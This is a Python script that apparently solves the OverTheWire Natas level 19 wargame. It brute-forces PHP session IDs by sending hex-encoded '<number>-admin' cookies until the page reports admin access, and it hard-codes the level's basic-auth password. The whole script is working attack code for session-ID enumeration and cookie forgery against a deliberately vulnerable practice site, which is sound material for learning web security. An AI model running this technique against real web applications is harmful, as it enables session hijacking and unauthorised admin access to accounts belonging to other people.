#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
session = requests.Session()

for i in range(641):

	print({"PHPSESSID" : str("%d-admin" %i).encode('utf-8').hex()})
	response = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" %i).encode('utf-8').hex()}, auth = (username, password))

	if ("You are an admin" in response.text):
		print("Got it!", i)
		print(response.text)
		break